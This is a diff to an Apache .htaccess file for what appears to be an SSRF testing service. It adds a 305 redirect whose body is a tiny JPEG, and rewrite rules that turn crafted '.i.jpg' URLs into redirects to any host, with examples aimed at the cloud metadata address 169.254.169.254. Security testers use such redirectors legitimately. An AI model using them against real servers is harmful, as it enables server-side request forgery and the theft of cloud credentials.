@@ -3,6 +3,7 @@ ErrorDocument 300 "ÿØÿÛ^@C^@^C^B^B^B^B^B^C^B^B^B^C^C^C^C^D^F^D^D^D^D^D^H^F^F
 ErrorDocument 301 "ÿØÿÛ^@C^@^C^B^B^B^B^B^C^B^B^B^C^C^C^C^D^F^D^D^D^D^D^H^F^F^E^F   ^H      ^H              ^L^O^L^K^N^K            ^M^Q^M^N^O^P^P^Q^P^L^R^S^R^P^S^O^P^P^PÿÉ^@^K^H^@^A^@^A^A^A^Q^@ÿÌ^@^F^@^P^P^EÿÚ^@^H^A^A^@^@?^@ÒÏ ÿÙ"
 ErrorDocument 302 "ÿØÿÛ^@C^@^C^B^B^B^B^B^C^B^B^B^C^C^C^C^D^F^D^D^D^D^D^H^F^F^E^F   ^H      ^H              ^L^O^L^K^N^K            ^M^Q^M^N^O^P^P^Q^P^L^R^S^R^P^S^O^P^P^PÿÉ^@^K^H^@^A^@^A^A^A^Q^@ÿÌ^@^F^@^P^P^EÿÚ^@^H^A^A^@^@?^@ÒÏ ÿÙ"
 ErrorDocument 303 "ÿØÿÛ^@C^@^C^B^B^B^B^B^C^B^B^B^C^C^C^C^D^F^D^D^D^D^D^H^F^F^E^F   ^H      ^H              ^L^O^L^K^N^K            ^M^Q^M^N^O^P^P^Q^P^L^R^S^R^P^S^O^P^P^PÿÉ^@^K^H^@^A^@^A^A^A^Q^@ÿÌ^@^F^@^P^P^EÿÚ^@^H^A^A^@^@?^@ÒÏ ÿÙ"
+ErrorDocument 305 "ÿØÿÛ^@C^@^C^B^B^B^B^B^C^B^B^B^C^C^C^C^D^F^D^D^D^D^D^H^F^F^E^F   ^H      ^H              ^L^O^L^K^N^K            ^M^Q^M^N^O^P^P^Q^P^L^R^S^R^P^S^O^P^P^PÿÉ^@^K^H^@^A^@^A^A^A^Q^@ÿÌ^@^F^@^P^P^EÿÚ^@^H^A^A^@^@?^@ÒÏ ÿÙ"
 ErrorDocument 307 "ÿØÿÛ^@C^@^C^B^B^B^B^B^C^B^B^B^C^C^C^C^D^F^D^D^D^D^D^H^F^F^E^F   ^H      ^H              ^L^O^L^K^N^K            ^M^Q^M^N^O^P^P^Q^P^L^R^S^R^P^S^O^P^P^PÿÉ^@^K^H^@^A^@^A^A^A^Q^@ÿÌ^@^F^@^P^P^EÿÚ^@^H^A^A^@^@?^@ÒÏ ÿÙ"
 ErrorDocument 308 "ÿØÿÛ^@C^@^C^B^B^B^B^B^C^B^B^B^C^C^C^C^D^F^D^D^D^D^D^H^F^F^E^F   ^H      ^H              ^L^O^L^K^N^K            ^M^Q^M^N^O^P^P^Q^P^L^R^S^R^P^S^O^P^P^PÿÉ^@^K^H^@^A^@^A^A^A^Q^@ÿÌ^@^F^@^P^P^EÿÚ^@^H^A^A^@^@?^@ÒÏ ÿÙ"
 
@@ -33,6 +34,13 @@ RewriteRule 302-([^/-]*)-([^/-]*)-(.*).i.jpg$ $1://$2/$3 [L,R=302,NC]
 RewriteEngine on
 RewriteCond %{REQUEST_URI} 303-([^/-]*)-([^/-]*)-(.*).i.jpg$
 RewriteRule 303-([^/-]*)-([^/-]*)-(.*).i.jpg$ $1://$2/$3 [L,R=303,NC]
+
+# 305 with response body
+# https://ssrf.localdomain.pw/img-with-body/305-https-169.254.169.254:80-.i.jpg
+# https://ssrf.localdomain.pw/img-with-body/305-https-169.254.169.254:80-test/.i.jpg
+RewriteEngine on
+RewriteCond %{REQUEST_URI} 305-([^/-]*)-([^/-]*)-(.*).i.jpg$
+RewriteRule 305-([^/-]*)-([^/-]*)-(.*).i.jpg$ $1://$2/$3 [L,R=305,NC]
 
 # 307 with response body
 # https://ssrf.localdomain.pw/img-with-body/307-https-169.254.169.254:80-.i.jpg
